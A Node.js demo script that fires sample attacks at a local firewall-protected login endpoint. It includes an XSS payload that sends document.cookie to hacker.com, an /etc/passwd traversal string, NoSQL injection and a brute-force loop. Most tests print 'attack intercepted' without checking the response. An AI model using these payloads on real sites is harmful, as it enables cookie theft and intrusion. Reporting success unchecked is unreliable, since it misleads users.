const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const askQuestion = (query) => new Promise(resolve => rl.question(query, resolve));

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function runDemo() {
    console.log('\n=========================================================');
    console.log('🛡️  SURAKSHA-SETU SECURITY FIREWALL DEMONSTRATION 🛡️');
    console.log('=========================================================\n');
    console.log('Welcome to the interactive Live Attack Simulator.');
    console.log('You can copy and paste real attack payloads from the internet to test the firewall.\n');

    // 1. NoSQL Injection Demo
    console.log('▶ TEST 1: NoSQL Database Injection Attack');
    console.log('  Instead of a normal email, an attacker tries to inject a NoSQL operator.');
    console.log('  Example payload to copy/paste: {"$gt": ""}');
    
    let noSqlPayload = await askQuestion('\n  [?] Enter your NoSQL Injection payload for the email field: ');
    
    // Attempt to parse it as JSON if they typed an object, otherwise send as string
    let parsedNoSql;
    try {
        parsedNoSql = JSON.parse(noSqlPayload);
    } catch(e) {
        parsedNoSql = noSqlPayload;
    }

    console.log('\n  [>] Sending malicious payload to /api/auth/login...');
    await delay(1000);
    
    try {
        const noSqlRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: parsedNoSql, password: 'hacked' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${noSqlRes.status}`);
        console.log('  [✔] EXPLANATION: The firewall stripped the malicious operators before they reached the database.\n');
    } catch (e) {
        console.log('  [!] Error connecting to backend. Is it running?\n');
    }

    // 2. XSS Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 2: Cross-Site Scripting (XSS) Attack');
    console.log('  An attacker attempts to inject malicious JavaScript into the form.');
    console.log('  Example payload to copy/paste: <script>fetch("http://hacker.com?cookie="+document.cookie)</script>test@example.com');
    
    let xssPayload = await askQuestion('\n  [?] Enter your XSS payload: ');

    console.log('\n  [>] Sending payload to backend...');
    await delay(1000);
    
    try {
        const xssRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: xssPayload, password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${xssRes.status}`);
        console.log('  [✔] EXPLANATION: xss-clean sanitized the input, stripping the <script> tags entirely so it cannot be executed or saved.\n');
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 3. Phishing / Malicious Link Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 3: Phishing / Malicious Link Injection');
    console.log('  An attacker attempts to insert a phishing link into the application.');
    console.log('  Example payload to copy/paste: Click here for free-money: http://bit.ly/hacked');
    
    let phishingPayload = await askQuestion('\n  [?] Enter your Phishing payload: ');

    console.log('\n  [>] Sending payload to backend...');
    await delay(1000);
    
    try {
        const phishRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: phishingPayload, password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${phishRes.status}`);
        const phishData = await phishRes.json();
        console.log(`  [✔] EXPLANATION: Deep Packet Inspection detected and blocked the phishing attempt. Reason: ${phishData.error}\n`);
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 4. Path Traversal Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 4: Path Traversal Attack');
    console.log('  An attacker attempts to break out of the directory to read server files.');
    console.log('  Example payload to copy/paste: ../../../etc/passwd');
    
    let pathPayload = await askQuestion('\n  [?] Enter your Path Traversal payload: ');

    console.log('\n  [>] Sending payload to backend...');
    await delay(1000);
    
    try {
        const pathRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: pathPayload, password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${pathRes.status}`);
        const pathData = await pathRes.json();
        console.log(`  [✔] EXPLANATION: Deep Packet Inspection detected and blocked the traversal attempt. Reason: ${pathData.error}\n`);
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 5. Bot / Scraper Attack Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 5: Automated Bot / Scraper Detection');
    console.log('  An attacker uses an automated scraping script (like python-requests or curl) to steal data.');
    console.log('  We will send a request with a suspicious User-Agent header.');
    
    await askQuestion('\n  [?] Press Enter to launch the Bot Attack...');

    console.log('\n  [>] Sending request with User-Agent: "python-requests/2.25.1" ...');
    await delay(1000);
    
    try {
        const botRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'python-requests/2.25.1'
            },
            body: JSON.stringify({ email: 'bot@bot.com', password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${botRes.status}`);
        const botData = await botRes.json();
        console.log(`  [✔] EXPLANATION: Firewall detected the scraping tool and blocked it. Reason: ${botData.error}\n`);
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 6. Large Payload / DoS Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 6: Denial of Service (DoS) Large Payload Attack');
    console.log('  An attacker attempts to crash the server by sending a massive 1MB string.');
    
    await askQuestion('\n  [?] Press Enter to launch the DoS Attack...');

    console.log('\n  [>] Generating massive payload and sending to backend...');
    await delay(1000);
    
    try {
        // Create a massive string > 10kb
        const massiveString = "A".repeat(50000); 
        const dosRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: massiveString, password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${dosRes.status}`);
        console.log(`  [✔] EXPLANATION: Payload Size Limiter (10kb max) blocked the request to prevent memory exhaustion.\n`);
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 7. Brute Force Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 7: Brute Force Password Attack (Rate Limiter)');
    console.log('  An attacker attempts to guess passwords by sending rapid requests.');
    
    let numRequests = await askQuestion('\n  [?] How many rapid login attempts should the hacker send? (e.g. 20): ');
    let count = parseInt(numRequests) || 20;

    console.log(`\n  [>] Firing ${count} rapid requests at the server...`);
    await delay(1000);
    
    let blocked = false;
    for (let i = 1; i <= count; i++) {
        try {
            const res = await fetch('http://localhost:5000/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'test@example.com', password: 'wrong' })
            });
            
            if (res.status === 429) {
                console.log(`\n  [💥] Request ${i}: BLOCKED! Status 429 (Too Many Requests)`);
                const data = await res.json();
                console.log(`  [💥] Firewall Response: "${data.error}"`);
                blocked = true;
                break;
            } else {
                process.stdout.write(`  [>] Req ${i}... `);
            }
        } catch (e) {}
    }

    if (blocked) {
        console.log('\n  [✔] EXPLANATION: The strict authentication rate-limiter detected the brute-force anomaly and blocked the IP address.');
        console.log('  [📧] AN EMAIL ALERT HAS BEEN DISPATCHED TO YOUR INBOX!');
    } else {
        console.log('\n  [!] The firewall allowed the requests because it didn\'t hit the 15 request threshold.');
    }
    
    console.log('\n=========================================================');
    console.log('✅ DEMONSTRATION COMPLETE - SYSTEM IS SECURE');
    console.log('=========================================================\n');

    rl.close();
}

runDemo();
